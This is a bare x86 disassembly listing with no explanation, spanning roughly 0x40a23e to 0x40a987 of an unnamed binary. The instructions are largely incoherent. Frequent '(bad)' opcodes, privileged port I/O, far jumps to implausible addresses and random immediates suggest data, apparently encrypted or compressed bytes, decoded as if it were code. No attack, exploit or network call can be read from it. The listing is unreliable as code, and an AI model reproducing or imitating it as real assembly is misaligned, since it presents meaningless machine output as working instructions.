  40a23e:	sbb    al,0xf5
  40a240:	push   ebp
  40a241:	fcomp  DWORD PTR [edx-0x75]
  40a244:	jmp    0x1e82726
  40a249:	fucomi st,st(0)
  40a24b:	sahf   
  40a24c:	pop    ds
  40a24d:	ja     0x40a26e
  40a24f:	cld    
  40a250:	sub    BYTE PTR [ebx-0x47],bh
  40a253:	(bad)  
  40a254:	out    dx,al
  40a255:	ret    
  40a256:	shl    BYTE PTR ds:0xe710bdd2,1
  40a25c:	ins    BYTE PTR es:[edi],dx
  40a25d:	(bad)  
  40a25e:	push   edx
  40a25f:	in     eax,0xdb
  40a261:	adc    DWORD PTR [ebx+0x71],edx
  40a264:	add    ch,dh
  40a266:	push   0x736f737a
  40a26b:	jmp    0x4c3c:0x9417070f
  40a272:	iret   
  40a273:	adc    eax,0x9d78ee32
  40a278:	(bad)  
  40a279:	(bad)  
  40a27a:	dec    edi
  40a27b:	push   edx
  40a27c:	fdivp  st(3),st
  40a27e:	lods   al,BYTE PTR ds:[esi]
  40a27f:	in     eax,0x1b
  40a281:	jnp    0x40a2e3
  40a283:	mov    WORD PTR [ecx-0x73b989d5],?
  40a289:	in     al,0xe4
  40a28b:	(bad)
  40a28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a28f:	and    edx,edx
  40a291:	add    dh,BYTE PTR ds:0xf1729987
  40a297:	adc    al,0xf5
  40a299:	in     eax,0x76
  40a29b:	jb     0x40a253
  40a29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a29e:	shl    DWORD PTR [esi+0x56],cl
  40a2a1:	jecxz  0x40a322
  40a2a3:	mov    dh,0x96
  40a2a5:	xor    ch,bh
  40a2a7:	lahf   
  40a2a8:	mov    ds:0xd1aae147,al
  40a2ad:	(bad)  
  40a2ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2af:	xchg   edi,eax
  40a2b0:	push   ss
  40a2b1:	inc    edx
  40a2b2:	nop
  40a2b3:	(bad)
  40a2b7:	jle    0x40a2d2
  40a2b9:	or     esp,DWORD PTR [edi-0x15f5c902]
  40a2bf:	jns    0x40a337
  40a2c1:	jecxz  0x40a299
  40a2c3:	and    dl,cl
  40a2c5:	pop    eax
  40a2c6:	dec    edx
  40a2c7:	(bad)  [edi+0x1f]
  40a2ca:	neg    BYTE PTR [ebx-0x64]
  40a2cd:	push   esi
  40a2ce:	cmp    dh,BYTE PTR [eax]
  40a2d0:	xlat   BYTE PTR ds:[ebx]
  40a2d1:	jp     0x40a2a8
  40a2d3:	aas    
  40a2d4:	sti    
  40a2d5:	adc    cl,BYTE PTR [ebx]
  40a2d7:	fdivr  DWORD PTR [esi-0x3c6793fb]
  40a2dd:	add    eax,edi
  40a2df:	mov    ebx,DWORD PTR [ebp-0x53756cbd]
  40a2e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e6:	dec    esp
  40a2e7:	nop
  40a2e8:	or     al,BYTE PTR [edx-0x110e8eaf]
  40a2ee:	mov    esp,0x5a671123
  40a2f3:	mov    ecx,0xfbc105d0
  40a2f8:	lea    ebp,[esi-0x8]
  40a2fb:	xlat   BYTE PTR ds:[ebx]
  40a2fc:	xchg   BYTE PTR [edi+0x32cc0e26],dh
  40a302:	push   ss
  40a303:	jno    0x40a292
  40a305:	shr    BYTE PTR [esi],0xdc
  40a308:	and    dh,BYTE PTR [esi-0x467fced6]
  40a30e:	outs   dx,DWORD PTR ds:[esi]
  40a30f:	rcl    DWORD PTR [edx],cl
  40a311:	jg     0x40a356
  40a313:	add    eax,esp
  40a315:	std    
  40a316:	ins    BYTE PTR es:[edi],dx
  40a317:	loop   0x40a2ad
  40a319:	pushf  
  40a31a:	aas    
  40a31b:	neg    BYTE PTR [edi+0x58]
  40a31e:	jae    0x40a320
  40a320:	jp     0x40a370
  40a322:	iret   
  40a323:	aaa    
  40a324:	(bad)  
  40a325:	jge    0x40a2e5
  40a327:	arpl   dx,dx
  40a329:	mov    ebp,0xbfeaccd7
  40a32e:	push   edx
  40a32f:	push   esp
  40a330:	loop   0x40a338
  40a332:	je     0x40a35d
  40a334:	je     0x40a378
  40a336:	out    0x8a,al
  40a338:	add    cl,BYTE PTR [ecx+eax*2]
  40a33b:	cs stc 
  40a33d:	dec    ecx
  40a33e:	xor    esi,DWORD PTR [esi-0x23]
  40a341:	mov    eax,0xad0cd396
  40a346:	xor    DWORD PTR [edx],0xffffff9d
  40a349:	xchg   esp,eax
  40a34a:	in     al,dx
  40a34b:	cli    
  40a34c:	cmp    edi,DWORD PTR [ebx+edx*8]
  40a34f:	jnp    0x40a2f8
  40a351:	adc    BYTE PTR [ecx-0x39cb5168],dh
  40a357:	pop    ss
  40a358:	aam    0xd2
  40a35a:	or     al,0xab
  40a35c:	data16 js 0x40a31f
  40a35f:	frndint 
  40a361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a362:	mov    cl,0x75
  40a364:	sar    DWORD PTR [ecx+0x28],cl
  40a367:	jg     0x40a350
  40a369:	jecxz  0x40a3bc
  40a36b:	ret    
  40a36c:	hlt    
  40a36d:	mov    edx,0x51171458
  40a372:	xchg   DWORD PTR [ebx+0x0],esi
  40a375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a376:	sahf   
  40a377:	xchg   BYTE PTR [ebx-0x5a09e512],al
  40a37d:	xchg   BYTE PTR [edx+esi*8-0x3c19ad24],dl
  40a384:	sbb    cl,ch
  40a386:	or     eax,0xc6687424
  40a38b:	daa    
  40a38c:	stos   BYTE PTR es:[edi],al
  40a38d:	scas   al,BYTE PTR es:[edi]
  40a38e:	mov    al,ds:0xdc789a46
  40a393:	lock push ecx
  40a395:	inc    esp
  40a396:	mov    ebx,0x52ec2925
  40a39b:	test   dh,ah
  40a39d:	push   ebp
  40a39e:	xchg   edi,esi
  40a3a0:	out    0x2a,al
  40a3a2:	and    BYTE PTR es:[edi+0x7d4fc55c],ah
  40a3a9:	inc    esp
  40a3aa:	aaa    
  40a3ab:	pusha  
  40a3ac:	inc    edx
  40a3ad:	jl     0x40a388
  40a3af:	in     al,dx
  40a3b0:	push   edi
  40a3b1:	out    0x59,eax
  40a3b3:	push   ds
  40a3b4:	sub    eax,0x7b6b9850
  40a3b9:	mov    BYTE PTR [ebx-0x29ca7eba],bl
  40a3bf:	dec    esp
  40a3c0:	and    dl,ch
  40a3c2:	xor    DWORD PTR [edx],esi
  40a3c4:	adc    al,0xb5
  40a3c6:	inc    esi
  40a3c7:	nop
  40a3c8:	ss int3 
  40a3ca:	(bad)  
  40a3cb:	cmp    al,0x5a
  40a3cd:	add    ah,BYTE PTR [ecx-0x1c]
  40a3d0:	or     al,0xb1
  40a3d2:	xchg   BYTE PTR [edx-0x3bccafd0],cl
  40a3d8:	call   0x32e2934a
  40a3dd:	sbb    esp,DWORD PTR [esi+0x1386f299]
  40a3e3:	cmp    eax,0x9dd64fa3
  40a3e8:	push   ds
  40a3e9:	or     al,0x63
  40a3eb:	dec    edi
  40a3ec:	ss bswap ecx
  40a3ef:	loopne 0x40a397
  40a3f1:	push   ebx
  40a3f2:	sub    al,0xfe
  40a3f4:	shr    ebp,0x28
  40a3f7:	cmp    dl,cl
  40a3f9:	lds    eax,FWORD PTR [esi]
  40a3fb:	in     eax,dx
  40a3fc:	xchg   DWORD PTR [ecx+0x7a3296b0],edx
  40a402:	jecxz  0x40a390
  40a404:	jle    0x40a417
  40a406:	xlat   BYTE PTR ds:[ebx]
  40a407:	gs in  al,0xbb
  40a40a:	(bad)  
  40a40b:	pop    es
  40a40c:	sbb    BYTE PTR [ebx-0x6b],bl
  40a40f:	jg     0x40a450
  40a411:	pop    ss
  40a412:	(bad)  
  40a413:	cld    
  40a414:	jbe    0x18aa56d0
  40a41a:	or     esp,DWORD PTR [edi+0x556bd03a]
  40a420:	and    DWORD PTR [eax],esi
  40a422:	cmc    
  40a423:	or     DWORD PTR [edx],esp
  40a425:	mov    WORD PTR [ebx+0x54],fs
  40a428:	ins    DWORD PTR es:[edi],dx
  40a429:	lds    esp,FWORD PTR [edx+0x42]
  40a42c:	pushf  
  40a42d:	enter  0x29af,0x70
  40a431:	mov    eax,0x89f98b54
  40a436:	sti    
  40a437:	xchg   esi,eax
  40a438:	cmp    BYTE PTR [eax-0x4a],bl
  40a43b:	or     BYTE PTR [esi],bh
  40a43d:	leave  
  40a43e:	mov    edx,0xaec9ceaf
  40a443:	and    al,0xfc
  40a445:	into   
  40a446:	xor    BYTE PTR [eax-0x6d8fb9d4],dh
  40a44c:	sbb    al,0xd
  40a44e:	outs   dx,DWORD PTR ds:[esi]
  40a44f:	ins    BYTE PTR es:[edi],dx
  40a450:	imul   edx,DWORD PTR [ebp-0x4c44d615],0x94f756dd
  40a45a:	pop    ecx
  40a45b:	call   0xf93c:0x762ccd2c
  40a462:	add    ebp,DWORD PTR [edx+0x54]
  40a465:	popf   
  40a466:	inc    esp
  40a467:	cmc    
  40a468:	mov    ch,ch
  40a46a:	test   al,0xb6
  40a46c:	jl     0x40a3ff
  40a46e:	clc    
  40a46f:	jne    0x40a47b
  40a471:	rcl    BYTE PTR [edx],1
  40a473:	sti    
  40a474:	sbb    eax,0x2604eb43
  40a479:	js     0x40a453
  40a47b:	js     0x40a401
  40a47d:	push   ecx
  40a47e:	xchg   edi,esp
  40a480:	push   edi
  40a481:	mov    ch,0x86
  40a483:	mov    ss,WORD PTR [ebx-0x62]
  40a486:	lods   al,BYTE PTR ds:[esi]
  40a487:	sub    ebp,ebp
  40a489:	inc    eax
  40a48a:	gs sub bl,bl
  40a48d:	sbb    eax,0x8d115ff0
  40a492:	xchg   ecx,eax
  40a493:	pop    esi
  40a494:	jne    0x40a419
  40a496:	in     eax,0x5f
  40a498:	push   ebx
  40a499:	cld    
  40a49a:	sbb    al,0x2f
  40a49c:	andnps xmm1,XMMWORD PTR gs:[ecx-0x37]
  40a4a1:	pop    esi
  40a4a2:	pminub mm3,QWORD PTR [ebx-0xf823e52]
  40a4a9:	aam    0xe8
  40a4ab:	sub    ch,BYTE PTR [ecx-0x7978ec44]
  40a4b1:	adc    eax,0x531af3b
  40a4b6:	xchg   ecx,eax
  40a4b7:	int    0xf1
  40a4b9:	sub    al,BYTE PTR [eax+ebp*1-0x5c]
  40a4bd:	lahf   
  40a4be:	xor    al,0xc2
  40a4c0:	daa    
  40a4c1:	je     0x40a4d8
  40a4c3:	inc    edi
  40a4c4:	push   ebp
  40a4c5:	and    edx,DWORD PTR [ebx+ebx*8-0x440f958e]
  40a4cc:	lahf   
  40a4cd:	ret    0x1a65
  40a4d0:	xlat   BYTE PTR ds:[ebx]
  40a4d1:	pop    ss
  40a4d2:	sbb    edx,DWORD PTR [ecx+0x2]
  40a4d5:	hlt    
  40a4d6:	xchg   edi,eax
  40a4d7:	adc    cl,bl
  40a4d9:	jp     0x40a52e
  40a4db:	iret   
  40a4dc:	xchg   BYTE PTR [eax],ch
  40a4de:	adc    ah,BYTE PTR [ebx-0x1780c425]
  40a4e4:	sub    eax,0x4cc5a8b8
  40a4e9:	inc    edi
  40a4ea:	and    al,0x8d
  40a4ec:	dec    ecx
  40a4ed:	mov    ds:0xb90c01fa,al
  40a4f2:	adc    al,cl
  40a4f4:	mov    dh,0xaf
  40a4f6:	popa   
  40a4f7:	mov    eax,0x8fc691e4
  40a4fc:	(bad)
  40a4ff:	arpl   WORD PTR [ecx],ax
  40a501:	ja     0x40a57b
  40a503:	jns    0x40a534
  40a505:	in     eax,dx
  40a506:	(bad)  
  40a508:	outs   dx,DWORD PTR ds:[esi]
  40a509:	xchg   edi,eax
  40a50a:	xchg   esp,eax
  40a50b:	in     eax,dx
  40a50c:	(bad)  
  40a50d:	(bad)  
  40a50f:	xor    dl,BYTE PTR [eax-0x5d]
  40a512:	jge    0x40a591
  40a514:	xchg   ebx,eax
  40a515:	(bad)  
  40a516:	dec    esp
  40a517:	cmp    bl,BYTE PTR ds:0x86a0ea08
  40a51d:	mov    ah,0x8a
  40a51f:	in     al,dx
  40a520:	jl     0x40a556
  40a522:	lods   eax,DWORD PTR ds:[esi]
  40a523:	dec    esi
  40a524:	setns  BYTE PTR [eax+eiz*2+0x6a5cdd01]
  40a52c:	push   edi
  40a52d:	adc    al,0x9a
  40a52f:	and    bl,BYTE PTR [ecx-0x43d457e5]
  40a535:	gs push eax
  40a537:	xlat   BYTE PTR ds:[ebx]
  40a538:	cli    
  40a539:	cmp    BYTE PTR [esi],cl
  40a53b:	jno    0x40a4e7
  40a53d:	fdiv   st,st(6)
  40a53f:	mul    cl
  40a541:	push   edi
  40a542:	(bad)  
  40a543:	fs icebp 
  40a545:	add    eax,0x4533558d
  40a54a:	sub    ebp,ebx
  40a54c:	dec    eax
  40a54d:	stc    
  40a54e:	mov    ch,0x9a
  40a550:	sub    edx,DWORD PTR [esi]
  40a552:	and    al,0x10
  40a554:	aaa    
  40a555:	ds cld 
  40a557:	dec    edi
  40a558:	jge    0x40a53d
  40a55a:	test   al,0xd1
  40a55c:	pop    esi
  40a55d:	xchg   ecx,eax
  40a55e:	xchg   esp,eax
  40a55f:	test   eax,0x6b1486fd
  40a564:	push   esi
  40a565:	test   esi,ecx
  40a567:	test   ah,al
  40a569:	cmp    eax,DWORD PTR [edi-0x5d]
  40a56c:	add    bl,0x98
  40a56f:	dec    ecx
  40a570:	dec    edx
  40a571:	mov    eax,DWORD PTR [eax+0x6c455382]
  40a577:	ja     0x40a5c5
  40a579:	hlt    
  40a57a:	popa   
  40a57b:	pop    esp
  40a57c:	mov    edx,0x245442cb
  40a581:	dec    eax
  40a582:	add    eax,0x1453b246
  40a587:	repnz sub BYTE PTR [edi+ecx*2],cl
  40a58b:	xchg   ebx,eax
  40a58c:	scas   al,BYTE PTR es:[edi]
  40a58d:	aad    0x25
  40a58f:	int3   
  40a590:	dec    edi
  40a591:	dec    edx
  40a592:	test   DWORD PTR [edx-0x52bc18ea],esp
  40a598:	push   esi
  40a599:	loop   0x40a5b0
  40a59b:	mov    edi,ds
  40a59d:	and    BYTE PTR [esi-0x7287eafa],bl
  40a5a3:	mov    ebx,0x9e9fa5ea
  40a5a8:	push   edx
  40a5a9:	adc    bh,BYTE PTR [ebx-0x17]
  40a5ac:	pop    esi
  40a5ad:	mov    al,0x6a
  40a5af:	gs out dx,eax
  40a5b1:	rcl    al,0x4b
  40a5b4:	jg     0x40a5a9
  40a5b6:	sbb    ax,0xa1fb
  40a5ba:	jnp    0x40a5fc
  40a5bc:	(bad)  
  40a5be:	mov    dl,0x76
  40a5c0:	popa   
  40a5c1:	(bad)  
  40a5c2:	adc    al,0x1d
  40a5c4:	ret    
  40a5c5:	push   ds
  40a5c6:	and    DWORD PTR [ebx+ecx*2],ecx
  40a5c9:	loope  0x40a58a
  40a5cb:	addr16 js 0x40a571
  40a5ce:	and    ah,0xcf
  40a5d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5d2:	dec    ecx
  40a5d3:	push   esi
  40a5d4:	fsub   QWORD PTR [ebp+0x33c028a8]
  40a5da:	push   esp
  40a5db:	fidivr WORD PTR ds:0xc7b76256
  40a5e1:	and    ebx,esi
  40a5e3:	dec    ecx
  40a5e4:	mov    cl,BYTE PTR [ebp-0x75]
  40a5e7:	xor    DWORD PTR [edx],edx
  40a5e9:	jl     0x40a660
  40a5eb:	add    ecx,DWORD PTR [edi+0x31]
  40a5ee:	adc    ah,al
  40a5f0:	or     al,0x7b
  40a5f2:	(bad)  
  40a5f3:	loope  0x40a5d8
  40a5f5:	inc    eax
  40a5f6:	jp     0x40a5c4
  40a5f8:	sbb    ah,BYTE PTR [edi]
  40a5fa:	out    dx,al
  40a5fb:	pop    ecx
  40a5fc:	mov    DWORD PTR [ecx],0xbb606d2c
  40a602:	into   
  40a603:	fsubr  QWORD PTR [edx]
  40a605:	sti    
  40a606:	imul   ecx,edi,0xffffffc9
  40a609:	sub    eax,0xf4d6e8c1
  40a60e:	stc    
  40a60f:	sbb    eax,0x70a51ad3
  40a614:	mov    ebx,0x27e12e02
  40a619:	or     eax,0x57aca61c
  40a61e:	xor    esp,DWORD PTR [edi-0x23aed0b8]
  40a624:	dec    edx
  40a625:	push   edx
  40a626:	sbb    bh,BYTE PTR [ebx+eiz*2+0x16]
  40a62a:	mov    fs,ecx
  40a62c:	xchg   esp,eax
  40a62d:	cmp    BYTE PTR [edi+0x13724cd1],bh
  40a633:	(bad)  
  40a634:	sub    al,0x42
  40a636:	xor    cl,BYTE PTR [eax+0x671453e1]
  40a63c:	mov    dh,0xdf
  40a63e:	ds inc edx
  40a640:	cmp    BYTE PTR [eax+0x7c],dl
  40a643:	std    
  40a644:	out    0xf5,al
  40a646:	mov    esi,0xbaf2791e
  40a64b:	mov    esi,0x77ca4011
  40a650:	stos   BYTE PTR es:[edi],al
  40a651:	sti    
  40a652:	mov    ch,dh
  40a654:	test   eax,0x2884c5ea
  40a659:	lds    ebp,FWORD PTR [edi]
  40a65b:	jl     0x40a6a8
  40a65d:	in     eax,dx
  40a65e:	test   DWORD PTR [esi],esi
  40a660:	stos   DWORD PTR es:[edi],eax
  40a661:	add    ah,0x31
  40a664:	add    BYTE PTR [ecx+0x3],al
  40a667:	in     eax,dx
  40a668:	loope  0x40a65a
  40a66a:	test   BYTE PTR [esi],cl
  40a66c:	into   
  40a66d:	xchg   BYTE PTR [ebx],al
  40a66f:	sub    DWORD PTR [ecx],esp
  40a671:	pop    ss
  40a672:	les    ebp,FWORD PTR [ebp-0x537808d6]
  40a678:	rol    bh,cl
  40a67a:	retf   
  40a67b:	ds pop ebp
  40a67d:	inc    ebp
  40a67e:	fistp  WORD PTR ds:0xf897ae2a
  40a684:	rol    ecx,cl
  40a686:	stc    
  40a687:	out    0x24,eax
  40a689:	dec    ebx
  40a68a:	ret    0xc371
  40a68d:	pusha  
  40a68e:	pop    edi
  40a68f:	dec    ecx
  40a690:	addr16 aas 
  40a692:	pop    edi
  40a693:	dec    ebp
  40a694:	push   0xf321175
  40a699:	push   ebx
  40a69a:	push   ecx
  40a69b:	cmp    al,BYTE PTR [edi+ebx*4-0xd]
  40a69f:	mov    esp,0x4366a6d5
  40a6a4:	adc    ah,BYTE PTR [ebx-0x5f]
  40a6a7:	xchg   BYTE PTR [esi-0x1],cl
  40a6aa:	mov    ds:0xd3d1a191,al
  40a6af:	or     al,0xb7
  40a6b1:	mov    eax,edi
  40a6b3:	sub    esi,DWORD PTR [ecx-0x57]
  40a6b6:	call   0x5ea9:0xda64a8ff
  40a6bd:	test   cl,dl
  40a6bf:	push   es
  40a6c0:	xchg   esi,eax
  40a6c1:	cmp    ecx,DWORD PTR ds:0x78488c5
  40a6c7:	dec    ebx
  40a6c8:	in     eax,dx
  40a6c9:	scas   al,BYTE PTR es:[edi]
  40a6ca:	test   al,0x2b
  40a6cc:	mov    ds:0xc7671f9d,eax
  40a6d1:	int    0x72
  40a6d3:	cmc    
  40a6d4:	cdq    
  40a6d5:	xchg   ebp,eax
  40a6d6:	pop    ss
  40a6d7:	pop    ecx
  40a6d8:	mov    ebp,0xec296299
  40a6dd:	int3   
  40a6de:	ja     0x40a672
  40a6e0:	sub    eax,0x77d0d1fe
  40a6e5:	sbb    DWORD PTR [ecx],ebp
  40a6e7:	push   ebx
  40a6e8:	aas    
  40a6e9:	stc    
  40a6ea:	mov    ebx,0xe01c9e6f
  40a6ef:	add    eax,esp
  40a6f1:	jb     0x40a6ef
  40a6f3:	ja     0x40a765
  40a6f5:	xor    eax,0x105b511c
  40a6fa:	aam    0xf5
  40a6fc:	out    dx,eax
  40a6fd:	jecxz  0x40a684
  40a6ff:	or     eax,0x7ccd0c2
  40a704:	std    
  40a705:	mov    esp,0x34bc1927
  40a70a:	mov    ebx,0x8a17b3fb
  40a70f:	and    bl,BYTE PTR [ecx-0x1c2518c3]
  40a715:	xor    BYTE PTR [eax],dh
  40a717:	jge    0x40a69c
  40a719:	xchg   edi,eax
  40a71a:	push   eax
  40a71b:	outs   dx,DWORD PTR ds:[esi]
  40a71c:	mov    eax,ebx
  40a71e:	xor    eax,DWORD PTR [eax+0x64]
  40a721:	add    BYTE PTR ds:0x128f4e66,bh
  40a727:	and    edx,DWORD PTR fs:[edi-0x5f]
  40a72b:	push   ecx
  40a72c:	cmp    edi,ebx
  40a72e:	adc    eax,0xf762e72f
  40a733:	xor    dl,dl
  40a735:	push   eax
  40a736:	jmp    0x40a7a2
  40a738:	xor    ebx,edi
  40a73a:	mov    eax,ds:0x1bcac7af
  40a73f:	imul   ebx,DWORD PTR [ebp+eiz*2-0x46],0xfffffff1
  40a744:	aaa    
  40a745:	pop    ecx
  40a746:	in     al,0xae
  40a748:	add    BYTE PTR [eax+0x3d246d99],0xfe
  40a74f:	jnp    0x40a6f1
  40a751:	inc    edx
  40a752:	push   edi
  40a753:	ret    0x6ac9
  40a756:	fadd   DWORD PTR [eax]
  40a758:	test   al,0x31
  40a75a:	fist   WORD PTR [ebp+0x30]
  40a75d:	sbb    ah,BYTE PTR [esi]
  40a75f:	jnp    0x40a7a2
  40a761:	sub    ah,BYTE PTR [edx-0x9e6ab22]
  40a767:	in     eax,0xf
  40a769:	(bad)  
  40a76a:	xchg   ebx,eax
  40a76b:	and    BYTE PTR [ebx-0x7828ee9],bh
  40a771:	cmp    DWORD PTR [ecx+0x603af5e],edi
  40a777:	sbb    eax,0x83a538d2
  40a77c:	out    dx,eax
  40a77d:	dec    esp
  40a77e:	pop    ecx
  40a77f:	ret    
  40a780:	jnp    0x40a763
  40a782:	xchg   edi,eax
  40a783:	sbb    dl,BYTE PTR [ebx]
  40a785:	lods   al,BYTE PTR ds:[esi]
  40a786:	aas    
  40a787:	dec    esp
  40a788:	xchg   esp,eax
  40a789:	sbb    cl,BYTE PTR fs:[ebp-0x2f264e1c]
  40a790:	mov    ebx,0xda797208
  40a795:	fneni(8087 only) 
  40a797:	repnz push ecx
  40a799:	mov    bh,0x6d
  40a79b:	arpl   ax,di
  40a79d:	jb     0x40a745
  40a79f:	test   eax,0xa0f21d59
  40a7a4:	fwait
  40a7a5:	sub    eax,0x331d6920
  40a7aa:	fwait
  40a7ab:	imul   edi,DWORD PTR [edx],0x27
  40a7ae:	push   edi
  40a7af:	mov    edx,0xc9d5f459
  40a7b4:	push   esp
  40a7b5:	rcr    BYTE PTR [eax-0x27db5288],1
  40a7bb:	into   
  40a7bc:	lea    eax,[ecx]
  40a7be:	cmp    BYTE PTR [edx+0x710cd54b],0x57
  40a7c5:	xor    al,0x9d
  40a7c7:	sub    BYTE PTR [eax],al
  40a7c9:	fbstp  TBYTE PTR [eax+edx*8+0x662df363]
  40a7d0:	or     al,0xf9
  40a7d2:	les    edx,FWORD PTR [eax]
  40a7d4:	(bad)  
  40a7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7d6:	scas   eax,DWORD PTR es:[edi]
  40a7d7:	ins    DWORD PTR es:[edi],dx
  40a7d8:	and    eax,0xb7b2f490
  40a7dd:	sub    al,0x21
  40a7df:	dec    esp
  40a7e0:	aas    
  40a7e1:	xchg   esp,eax
  40a7e2:	push   cs
  40a7e3:	(bad)
  40a7e6:	dec    edi
  40a7e7:	scas   al,BYTE PTR es:[edi]
  40a7e8:	shl    ebx,cl
  40a7ea:	xlat   BYTE PTR ds:[ebx]
  40a7eb:	xchg   edx,eax
  40a7ec:	mov    bl,0xde
  40a7ee:	fldcw  WORD PTR [esi+0x746cb69c]
  40a7f4:	psubb  mm3,QWORD PTR [ebx]
  40a7f7:	int    0x8d
  40a7f9:	mov    ds:0xe130da87,eax
  40a7fe:	fisttp WORD PTR [edx+esi*8-0x2dce477]
  40a805:	mov    al,0xbf
  40a807:	out    0xe4,eax
  40a809:	xor    al,0x44
  40a80b:	mov    al,ds:0xa6da9c0f
  40a810:	(bad)  
  40a811:	and    eax,0x387abf23
  40a816:	scas   al,BYTE PTR es:[edi]
  40a817:	jg     0x40a86b
  40a819:	mov    ecx,0x6562f258
  40a81e:	inc    ebx
  40a81f:	test   DWORD PTR [edi],esi
  40a821:	mov    edi,DWORD PTR [edx+0x48be1904]
  40a827:	sub    DWORD PTR [eax+0x1b580142],esi
  40a82d:	clc    
  40a82e:	mov    dl,0x6b
  40a830:	stos   DWORD PTR es:[edi],eax
  40a831:	je     0x40a875
  40a833:	retf   
  40a834:	and    ah,dl
  40a836:	test   DWORD PTR [edx],edx
  40a838:	stos   DWORD PTR es:[edi],eax
  40a839:	bound  edx,QWORD PTR [ebp-0x6bcc7212]
  40a83f:	pushf  
  40a840:	adc    DWORD PTR [ebp+0x28910065],0xfffffffd
  40a847:	data16 fistp QWORD PTR [ecx-0x40]
  40a84b:	jo     0x40a82e
  40a84d:	xor    dl,BYTE PTR [esi-0x49]
  40a850:	adc    al,0x36
  40a852:	mov    ebp,0xfc6ccad1
  40a857:	xlat   BYTE PTR ds:[ebx]
  40a858:	loope  0x40a869
  40a85a:	adc    DWORD PTR [esp+eiz*8],eax
  40a85d:	sbb    bh,BYTE PTR [edi-0x5a133977]
  40a863:	call   0x8c66cceb
  40a868:	dec    esp
  40a869:	dec    ebp
  40a86a:	pop    ds
  40a86b:	dec    ebx
  40a86c:	enter  0xe1c4,0xfb
  40a870:	stos   BYTE PTR es:[edi],al
  40a871:	xchg   ebx,eax
  40a872:	mov    edx,0xe5e3a50d
  40a877:	pop    DWORD PTR [ebp+0x532671c7]
  40a87d:	imul   esi,DWORD PTR [edx],0x30bda50e
  40a883:	jle    0x40a8df
  40a885:	rcl    BYTE PTR [ebx+ecx*8],cl
  40a888:	jmp    0x40a83a
  40a88a:	adc    cl,ah
  40a88c:	loop   0x40a8b1
  40a88e:	mov    ah,0x5f
  40a890:	loop   0x40a829
  40a892:	je     0x40a81c
  40a894:	jmp    0x32489bcd
  40a899:	sbb    BYTE PTR [edi],al
  40a89b:	test   al,0x6f
  40a89d:	add    BYTE PTR [edx-0x57],0xd7
  40a8a1:	xchg   BYTE PTR [edx],ah
  40a8a3:	js     0x40a8d6
  40a8a5:	cmp    BYTE PTR [eax],dl
  40a8a7:	xor    ebx,DWORD PTR [eax]
  40a8a9:	mov    WORD PTR [edi],gs
  40a8ab:	push   eax
  40a8ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8ad:	aas    
  40a8ae:	repnz add DWORD PTR ds:0x990acba6,ebp
  40a8b5:	scas   al,BYTE PTR es:[edi]
  40a8b6:	xchg   ecx,eax
  40a8b7:	in     eax,0x58
  40a8b9:	sub    eax,0x7c618164
  40a8be:	scas   eax,DWORD PTR es:[edi]
  40a8bf:	in     eax,0xcb
  40a8c1:	imul   ecx,DWORD PTR [edx-0x4b01260f],0xffffffcd
  40a8c8:	aaa    
  40a8c9:	in     al,dx
  40a8ca:	sub    dl,BYTE PTR [ebp+0x77]
  40a8cd:	arpl   WORD PTR [esp+eiz*8-0x34829eec],bx
  40a8d4:	add    eax,ecx
  40a8d6:	aaa    
  40a8d7:	out    dx,eax
  40a8d8:	mov    BYTE PTR [ecx],bl
  40a8da:	mov    cl,0x2f
  40a8dc:	repz (bad) 
  40a8de:	fadd   DWORD PTR [esp+esi*2]
  40a8e1:	mov    edx,0xed0f78ef
  40a8e6:	pushf  
  40a8e7:	xor    eax,DWORD PTR [esi]
  40a8e9:	ss mov esi,0xbbe58838
  40a8ef:	addr16 pop esi
  40a8f1:	xchg   BYTE PTR ss:[ebx-0x47],bh
  40a8f5:	imul   ecx,DWORD PTR [esi],0xfffffff5
  40a8f8:	push   eax
  40a8f9:	and    al,0xe2
  40a8fb:	xchg   ebx,eax
  40a8fc:	or     ch,ah
  40a8fe:	imul   edx,DWORD PTR [edi],0x36
  40a901:	in     eax,dx
  40a902:	leave  
  40a903:	dec    eax
  40a904:	sub    BYTE PTR ds:0xb2aa6d2a,bl
  40a90a:	push   es
  40a90b:	mov    BYTE PTR [edi-0x18],cl
  40a90e:	sbb    eax,0xfaf21f06
  40a913:	into   
  40a914:	ror    DWORD PTR [edx+0x295b7e82],1
  40a91a:	aad    0x47
  40a91c:	mov    al,0x8e
  40a91e:	out    dx,al
  40a91f:	mov    ecx,0xbfd8c3ae
  40a924:	mov    eax,ds:0xc04f5e25
  40a929:	xchg   DWORD PTR [ebx+0x2d24571f],esi
  40a92f:	(bad)  
  40a930:	ror    BYTE PTR [esi+0x1d],0x18
  40a934:	sbb    BYTE PTR [esp+esi*8],ch
  40a937:	jbe    0x40a8bf
  40a939:	shl    DWORD PTR [edi+0xf1599bc],1
  40a93f:	repnz mov al,ds:0xddb45ad5
  40a945:	jno    0x40a942
  40a947:	inc    ebx
  40a948:	and    al,al
  40a94a:	push   ss
  40a94b:	sub    DWORD PTR [ecx+0x49],esi
  40a94e:	mov    al,ds:0xdae0deec
  40a953:	xchg   DWORD PTR [esi-0x27],esp
  40a956:	mov    dl,0x30
  40a958:	mov    cl,0xcd
  40a95a:	in     eax,0x74
  40a95c:	sub    eax,0xddaf0b5a
  40a961:	cli    
  40a962:	xlat   BYTE PTR ds:[ebx]
  40a963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a964:	jecxz  0x40a938
  40a966:	pop    ds
  40a967:	or     dl,BYTE PTR [esi-0x13]
  40a96a:	aam    0x56
  40a96c:	out    0x11,eax
  40a96e:	in     al,dx
  40a96f:	jbe    0x40a9d5
  40a971:	rol    BYTE PTR [ecx+0x2749e61e],1
  40a977:	push   edx
  40a978:	in     eax,0x5d
  40a97a:	addr16 sub al,0xb0
  40a97d:	xchg   edx,eax
  40a97e:	push   cs
  40a97f:	inc    esi
  40a980:	div    bh
  40a982:	aad    0x69
  40a984:	mov    DWORD PTR [edi],esp
  40a986:	(bad)  
  40a987:	push   0x1f
